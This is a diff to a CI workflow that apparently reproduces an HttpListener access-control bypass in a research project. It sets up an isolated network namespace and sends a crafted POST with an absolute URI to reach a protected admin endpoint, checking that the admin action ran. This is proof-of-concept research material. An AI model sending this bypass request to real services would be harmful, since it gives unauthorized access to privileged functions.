@@ -12,6 +12,23 @@ jobs:
       - uses: actions/checkout@v4
       - uses: actions/setup-dotnet@v4
         with: { dotnet-version: '10.0.x' }
+      - name: Configure isolated non-loopback client namespace
+        shell: bash
+        run: |
+          set -euxo pipefail
+          sudo ip netns del hlclient 2>/dev/null || true
+          sudo ip link del hl-veth-host 2>/dev/null || true
+          sudo ip netns add hlclient
+          sudo ip link add hl-veth-host type veth peer name hl-veth-client
+          sudo ip link set hl-veth-client netns hlclient
+          sudo ip addr add 10.203.0.1/24 dev hl-veth-host
+          sudo ip link set hl-veth-host up
+          sudo ip netns exec hlclient ip addr add 10.203.0.2/24 dev hl-veth-client
+          sudo ip netns exec hlclient ip link set lo up
+          sudo ip netns exec hlclient ip link set hl-veth-client up
+          sudo ip netns exec hlclient ip route
+          ip addr show hl-veth-host
+
       - name: Start protected HttpListener server
         working-directory: research/httplistener-remote-port-bypass
         shell: bash
@@ -27,12 +44,11 @@ jobs:
           cat /tmp/remote-server.log
           exit 1
 
-      - name: Send attack from separate Docker network namespace
+      - name: Send attack from isolated non-loopback network namespace
         shell: bash
         run: |
           set -euxo pipefail
-          docker run --rm --add-host=host.docker.internal:host-gateway python:3.13-alpine \
-            python -c 'import socket; s=socket.create_connection(("host.docker.internal",46181),5); s.settimeout(10); req=b"POST http://service.test:46182/admin-action HTTP/1.1\\r\\nHost: service.test:46182\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\n\\r\\n"; s.sendall(req); data=s.recv(8192); print(data.decode("latin1")); assert b"200" in data and b"REMOTE_ADMIN_ACTION_EXECUTED=true" in data'
+          sudo ip netns exec hlclient python3 -c 'import socket; s=socket.create_connection(("10.203.0.1",46181),5); s.settimeout(10); req=b"POST http://service.test:46182/admin-action HTTP/1.1\\r\\nHost: service.test:46182\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\n\\r\\n"; s.sendall(req); data=s.recv(8192); print(data.decode("latin1")); assert b"200" in data and b"REMOTE_ADMIN_ACTION_EXECUTED=true" in data'
 
       - name: Print server diagnostics
         if: always()
@@ -54,3 +70,11 @@ jobs:
           grep -F 'WIRE_HOST_EQUALS_TARGET_AUTHORITY=True' /tmp/remote-server.log
           grep -F 'MARKER_EXISTS=True' /tmp/remote-server.log
           grep -F 'REMOTE_PORT_ONLY_PROOF=PASS' /tmp/remote-server.log
+
+      - name: Cleanup client namespace
+        if: always()
+        shell: bash
+        run: |
+          sudo ip netns del hlclient 2>/dev/null || true
+          sudo ip link del hl-veth-host 2>/dev/null || true
+
